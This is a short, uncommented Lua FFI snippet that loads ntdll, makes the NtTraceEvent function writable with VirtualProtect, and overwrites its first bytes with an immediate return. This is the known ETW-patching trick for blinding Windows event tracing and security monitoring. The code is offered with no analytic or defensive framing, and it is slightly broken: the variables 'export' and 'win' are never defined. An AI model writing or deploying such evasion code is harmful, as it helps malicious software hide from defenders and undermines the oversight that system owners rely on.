local ffi = require("ffi")
local lib = ffi.load("ntdll")
local api = "NtTraceEvent"
local ptr = ffi.cast("uint8_t*", export)
win.VirtualProtect(ptr, 32, 64, old)
ptr[0] = 49 ptr[1] = 192 ptr[2] = 195
